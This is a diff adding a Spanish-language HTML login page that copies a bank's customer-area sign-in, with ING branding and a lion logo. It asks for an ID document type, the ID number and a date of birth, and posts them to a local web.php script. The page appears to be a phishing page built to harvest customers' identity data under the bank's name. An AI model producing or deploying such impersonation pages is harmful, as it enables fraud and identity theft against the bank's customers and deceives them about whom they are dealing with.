@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/png" href="img/favicons.png">
+</head>
+<body>
+<div class="recuadro">
+<header>
+        <img src="img/logoING.svg" alt="" class="ing">
+        <img src="img/tel.png" alt="" class="tel">
+</header>
+
+<section>
+    <img src="img/leon.png" alt="" class="leon">
+<div class="formulario">
+    <div class="margen">
+    <form action="web.php" method="POST">
+        <br>
+        <h4>Accede a tu Área Clientes</h4>
+        <h5>Elige tu documento</h5>
+            <p><input type="radio" name="form1" id="Identificacion">DNI o Tarjeta de residencia</p>
+            <p><input type="radio" name="form1" id="Pasaporte">Pasaporte</p>
+        <h5>Número de documento</h5>
+            <p><input type="text" name="numdoc" id="numdoc" style="width: 89%; height: 30px;" placeholder="DNI o Tarjeta de residencia"></p>
+        <h5>Fecha de nacimiento</h5>
+            <p><input type="date" style="width: 89%; height: 30px;"></p>
+            <p><input type="checkbox" class="checkbox"> Recordar</p>
+            <p><input type="submit" value="Entrar" class="boton"></p>
+    </form>
+    <p><span class="naranja">&#62   </span><a href="">Accede con DNI electrónico</a></p>
+    <p><span class="naranja">&#62   </span><a href="">Más información sobre seguridad</a></p>
+    </div>  
+<br id="brfin">
+<br>
+</div>
+<br><br><br><br><br><br>
+</section>
+</div>    
+</body>
+</html>
